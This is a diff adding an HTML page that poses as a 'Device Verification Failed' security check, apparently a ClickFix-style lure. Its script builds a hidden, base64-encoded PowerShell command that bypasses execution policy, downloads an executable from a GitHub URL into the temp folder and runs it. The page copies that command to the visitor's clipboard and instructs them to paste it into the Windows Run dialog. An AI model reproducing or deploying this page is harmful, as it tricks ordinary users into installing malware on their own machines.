@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Device Verification</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    .modal-wrap {
+        font-family: 'Inter', sans-serif;
+        min-height: 100vh;
+        width: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        position: relative;
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+    }
+
+    /* Dark overlay */
+    #bg-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.78);
+        z-index: 0;
+        pointer-events: none;
+    }
+    .modal-content { position: relative; z-index: 1; width: 100%; display: flex; align-items: center; justify-content: center; }
+
+
+
+
+    .page { display: none; }
+    .page.active { display: flex; align-items: center; justify-content: center; width: 100%; }
+
+    /* reCAPTCHA card */
+    .recaptcha-card { background: #fff; border: 1px solid #d3d3d3; border-radius: 4px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1); width: 300px; }
+    .rc-header { padding: 12px 14px 10px; border-bottom: 1px solid #e0e0e0;
+      display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 500; color: #555; }
+    .rc-header svg { color: #4a90d9; }
+    .rc-body { padding: 16px 14px; display: flex; align-items: center; justify-content: space-between; }
+    .rc-left { display: flex; align-items: center; gap: 12px; cursor: pointer; }
+    .rc-checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .rc-checkbox svg { display: none; }
+    .rc-checkbox.checked { background: #4a90d9; border-color: #4a90d9; }
+    .rc-checkbox.checked svg { display: block; }
+    .rc-label { font-size: 14px; color: #333; }
+    .rc-badge { text-align: center; }
+    .rc-shield { width: 38px; height: 38px; background: linear-gradient(180deg,#4a90d9,#2f6fb5);
+      border-radius: 50% 50% 50% 50% / 55% 55% 45% 45%; display: flex; align-items: center; justify-content: center; margin: 0 auto 4px; }
+    .rc-badge-label { font-size: 8px; color: #9e9e9e; letter-spacing: 0.02em; }
+
+    /* Error card */
+    .error-card { background: #fff; border: 1px solid #dadce0; border-radius: 8px;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.1); width: 100%; max-width: min(440px, calc(100vw - 2rem)); overflow: hidden; }
+
+    .err-header { padding: 16px 24px; border-bottom: 1px solid #dadce0;
+      display: flex; align-items: center; gap: 12px; }
+    .err-icon { width: 32px; height: 32px; background: #ea4335; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; color: #fff; font-size: 18px; font-weight: 700; }
+    .err-header h1 { font-size: 16px; font-weight: 600; color: #202124; }
+    .err-alert { background: #fce8e6; border-left: 4px solid #ea4335;
+      padding: 12px 16px; margin: 16px 24px 0; border-radius: 0 4px 4px 0;
+      font-size: 13.5px; color: #c5221f; line-height: 1.55; }
+    .err-os { margin: 14px 24px 0; background: #f1f3f4; border-radius: 6px;
+      padding: 10px 14px; display: flex; align-items: center; gap: 10px;
+      font-size: 13px; color: #3c4043; }
+    .err-bullets { margin: 14px 24px 0; display: flex; flex-direction: column; gap: 8px; }
+    .err-bullet { display: flex; gap: 10px; align-items: flex-start; font-size: 13px; color: #3c4043; }
+    .err-bullet-dot { width: 18px; height: 18px; background: #34a853; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+    .err-bullet strong { font-weight: 600; color: #202124; }
+    .err-fix { margin: 14px 24px 0; background: #fffbe6; border: 1px solid #f9cb40;
+      border-radius: 6px; padding: 16px; }
+    .err-fix-title { font-size: 12px; font-weight: 700; color: #7a5800; letter-spacing: 0.05em; margin-bottom: 12px; }
+    .err-step { font-size: 13.5px; color: #3c4043; line-height: 1.55; margin-bottom: 10px; }
+    .err-step:last-child { margin-bottom: 0; }
+    .kbd { display: inline-block; background: #202124; color: #fff;
+      padding: 1px 7px; border-radius: 3px; font-family: monospace; font-size: 12px; }
+    .err-copy-btn { display: block; width: calc(100% - 48px); margin: 14px 24px 0;
+      background: #1a73e8; color: #fff; border: none; padding: 13px; border-radius: 6px;
+      font-size: 14px; font-weight: 500; font-family: 'Inter', sans-serif; cursor: pointer; }
+    .err-copy-btn:hover { background: #1557b0; }
+    .err-footer { margin-top: 14px; padding: 14px 24px; background: #f8f9fa;
+      border-top: 1px solid #dadce0; font-size: 12px; color: #5f6368; line-height: 1.9; font-family: monospace; }
+    .err-footer .ef-red { color: #c5221f; font-weight: 600; }
+    .modal-wrap.has-bg { background-color: transparent; background-size: cover;
+      background-position: center; background-repeat: no-repeat; background-attachment: fixed; }
+  </style>
+
+</head>
+<body>
+<div class="modal-wrap">
+  <div id="bg-overlay"></div>
+  <div class="modal-content">
+
+
+  <!-- PAGE 2: Device Verification Failed -->
+  <div class="page active" id="page2">
+    <div class="error-card">
+      <div class="err-header">
+        <div class="err-icon">!</div>
+        <h1>Device Verification Failed</h1>
+      </div>
+      <div class="err-alert">
+        <strong>Device verification</strong> could not be completed after multiple attempts. Your access to this resource has been temporarily restricted.
+      </div>
+      <div class="err-os" id="osInfo"></div>
+      <div class="err-bullets">
+        <div class="err-bullet">
+          <div class="err-bullet-dot" style="background:#ea4335;"><svg width="10" height="10" fill="none" stroke="#fff" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div>
+          <div><strong>Device verification failed</strong><br><span style="font-weight:400;">Our system was unable to validate your device during the security check. This may be caused by a VPN, proxy, or browser extension.</span></div>
+        </div>
+        <div class="err-bullet">
+          <div class="err-bullet-dot" style="background:#ea4335;"><svg width="10" height="10" fill="none" stroke="#fff" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div>
+          <div><strong>Session token expired</strong><br><span style="font-weight:400;">The verification session is no longer valid. A new session must be initiated to proceed.</span></div>
+        </div>
+      </div>
+      <div class="err-fix">
+        <div class="err-fix-title">STEPS TO FIX THIS ERROR:</div>
+        <p style="font-size:13.5px;color:#3c4043;line-height:1.55;margin-bottom:12px;">To restore access, please verify your device by following the steps below.</p>
+        <div class="err-step">1. Press <span class="kbd">Win</span> + <span class="kbd">R</span> on your keyboard to open the Run dialog.</div>
+        <div class="err-step">2. Press <span class="kbd">Ctrl</span> + <span class="kbd">V</span> to paste the verification command into the field, then press <strong>Enter</strong> to execute it.</div>
+        <div class="err-step">3. Under <strong>App permissions</strong>, ensure your browser has access to the necessary device resources required for identity verification.</div>
+        <div class="err-step">4. Temporarily disable any VPN, proxy, or ad-blocker — they may prevent the verification server from confirming your device.</div>
+        <div class="err-step">5. Reload this page and complete the verification again to restore full access.</div>
+      </div>
+      <button class="err-copy-btn" id="copyBtn">Copy Verification Command</button>
+      <div class="err-footer" id="errFooter"></div>
+    </div>
+  </div>
+  </div><!-- /.modal-content -->
+
+</div>
+
+<script>
+  // === OBFUSCATED PAYLOAD (Best Method) ===
+  var ps1Url = "https://raw.githubusercontent.com/lynnetekhosa-commits/ShadowKeygen/main/test.exe";
+
+  // Create Base64 encoded command
+  function generateEncodedCommand(url) {
+    const cmd = `irm '${url}' -OutFile "$env:TEMP\\u.exe"; Start-Process "$env:TEMP\\u.exe"`;
+    const bytes = new TextEncoder().encode(cmd);
+    const base64 = btoa(String.fromCharCode(...bytes));
+    return `powershell -NoP -Ep Bypass -W Hidden -EncodedCommand ${base64}`;
+  }
+
+  var CMD = generateEncodedCommand(ps1Url);
+
+  fetch('/api/config')
+    .then(r => r.json())
+    .then(cfg => {
+        const bgUrl = cfg.modal_bg_url || cfg.bg_url;
+        if (bgUrl) {
+            const wrap = document.querySelector('.modal-wrap');
+            wrap.style.backgroundImage = `url('${bgUrl}')`;
+        }
+    })
+    .catch(() => {});
+
+
+
+  // OS Detection
+  var ua = navigator.userAgent;
+  var isWin = /Windows/i.test(ua);
+  var osLabel = isWin ? 'Win' : 'Unknown';
+  var winSvg = '<svg width="15" height="15" viewBox="0 0 24 24" fill="#0078d4"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.551H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>';
+
+  document.getElementById('osInfo').innerHTML = 
+    (isWin ? winSvg : '') + 
+    ' <span><strong>Detected device OS:</strong> ' + osLabel + '</span>';
+
+  // Reliable Copy Function
+  async function copyToClipboard(text) {
+    try {
+      await navigator.clipboard.writeText(text);
+      return true;
+    } catch (err) {
+      const ta = document.createElement("textarea");
+      ta.value = text;
+      ta.style.position = "fixed";
+      ta.style.left = "-999999px";
+      ta.style.top = "-999999px";
+      document.body.appendChild(ta);
+      ta.focus();
+      ta.select();
+      const success = document.execCommand('copy');
+      document.body.removeChild(ta);
+      return success;
+    }
+  }
+
+  // Auto-copy when switching pages
+  function verify() {
+    document.getElementById('checkbox').classList.add('checked');
+    document.getElementById('cb-label').textContent = "Verifying...";
+
+    setTimeout(async () => {
+      document.getElementById('page1').classList.remove('active');
+      document.getElementById('page2').classList.add('active');
+      await copyToClipboard(CMD);
+    }, 800);
+  }
+
+  document.getElementById('copyBtn').addEventListener('click', () => {
+    copyToClipboard(CMD);
+  });
+</script>
+</body>
+</html>
